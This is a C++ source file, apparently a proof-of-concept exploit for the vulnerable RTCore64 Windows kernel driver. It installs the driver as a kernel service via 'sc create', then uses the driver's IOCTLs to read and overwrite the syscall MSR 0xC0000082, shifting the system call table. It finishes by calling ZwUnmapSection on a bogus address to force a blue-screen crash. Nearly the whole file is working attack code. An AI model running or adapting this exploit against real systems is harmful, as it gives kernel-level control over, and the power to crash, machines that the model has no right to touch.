#include <iostream>
#include <Windows.h>
#include <fileapi.h>
#include "Ioctl.h"
#include "vulnurable.h"

/*
Skipped VULNURABLE_IOCTL1, VULNURABLE_IOCTL9, VULNURABLE_IOCTL14, VULNURABLE_IOCTL15,
USELESS_IOCTL10 and USELESS_IOCTL11
*/

// Global variables:
const char* KernelDeviceName = "\\Device\\RTCore64";
const char* KernelDriverName = "\\DosDevices\\RTCore64";
const char* SymbolicLink = "\\\\.\\RTCore64";
const char* VulnFileName = "3ecd3ca61ffc54b0d93f8b19161b83da.bin";
HANDLE DriverHandle = INVALID_HANDLE_VALUE;


DWORD LoadVulnurableDriver(const char* FileName) {
    char CreateCommand[1024] = { 0 };
    char VulnPath[1024] = { 0 };
    DWORD VulnPathLength = ERROR_SUCCESS;


    // Get path of vulnurable driver and configure and start the service:
    VulnPathLength = GetFullPathNameA(FileName, sizeof(VulnPath), VulnPath, NULL);
    if (VulnPathLength == 0) {
        DeleteFileA(FileName);
        return GetLastError();
    }
    strcat_s(CreateCommand, "sc create DriverPoC type=kernel start=auto binPath=");
    strcat_s(CreateCommand, VulnPath);
    system("sc stop DriverPoC");
    system("sc delete DriverPoC");
    system(CreateCommand);
    system("sc start DriverPoC");
    return ERROR_SUCCESS;
}


void UnloadVulnurableDriver(const char* FileName) {
    system("sc stop DriverPoC");
    system("sc delete DriverPoC");
}


int main(int argc, char* argv[]) {
    struct stat CheckExists = { 0 };
    DWORD LastError = ERROR_SUCCESS;
    PVOID SSDTBaseAddress = NULL;


    // Check for invalid parameters;
    if (argc != 1) {
        printf("[-] Invalid command-line parameters: RTCORE64.exe\n");
        return FALSE;
    }


    // Load driver into file and create service:
    LastError = LoadVulnurableDriver(VulnFileName);
    if (LastError != ERROR_SUCCESS) {
        LastError = GetLastError();
        printf("[-] Failed to load driver %s into file and create service: %d\n", SymbolicLink, LastError);
        return FALSE;
    }


    // Get handle to driver:
    DriverHandle = CreateFileA(SymbolicLink, GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        LastError = GetLastError();
        printf("[-] Failed to get handle to driver %s: %d\n", SymbolicLink, LastError);
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[+] Got handle to driver %s - %d\n", SymbolicLink, (DWORD)DriverHandle);


    // Perform read from MSR 0xC0000082 (SystemCallTable/shadow if KVA shadowing is enabled):
    printf("[i] Performing __readmsr() to get base address of SystemCallTable (MSR 0xC0000082) ..\n");
    if (!IoctlTriggers::ReadFromMsrTrigger(DriverHandle, 0xC0000082, &SSDTBaseAddress)) {
        LastError = GetLastError();
        printf("[-] Failed to read MSR 0xC0000082 using driver %s: %d\n", SymbolicLink, LastError);
        UnloadVulnurableDriver(VulnFileName);
        CloseHandle(DriverHandle);
        return FALSE;
    }


    // Perform write to MSR 0xC0000082 (SystemCallTable/shadow if KVA shadowing is enabled) to move all one forward:
    printf("[i] Performing __writemsr() to move SystemCallTable one entry forward (MSR 0xC0000082) ..\n");
    if (!IoctlTriggers::WriteToMsrTrigger(DriverHandle, 0xC0000082, (ULONG64)SSDTBaseAddress + sizeof(ULONG))) {
        LastError = GetLastError();
        printf("[-] Failed to write to MSR 0xC0000082 using driver %s: %d\n", SymbolicLink, LastError);
        UnloadVulnurableDriver(VulnFileName);
        CloseHandle(DriverHandle);
        return FALSE;
    }


    // Try to trigger BSoD with ZwUnmapSection() with address 0x1122334455667788:
    printf("[i] Trigger BSoD with ZwUnmapSection() with address 0x1122334455667788 ..\n");
    if (!IoctlTriggers::UnmapViewOfSectionTrigger(DriverHandle, (PVOID)0x1122334455667788)) {
        LastError = GetLastError();
        printf("[-] Failed to trigger BSoD with ZwUnmapSection() using driver %s: %d\n", SymbolicLink, LastError);
        UnloadVulnurableDriver(VulnFileName);
        CloseHandle(DriverHandle);
        return FALSE;
    }
    printf("[-] Triggering BSoD with ZwUnmapSection() with address 0x1122334455667788 failed\n");
    UnloadVulnurableDriver(VulnFileName);
    CloseHandle(DriverHandle);
    return TRUE;
}
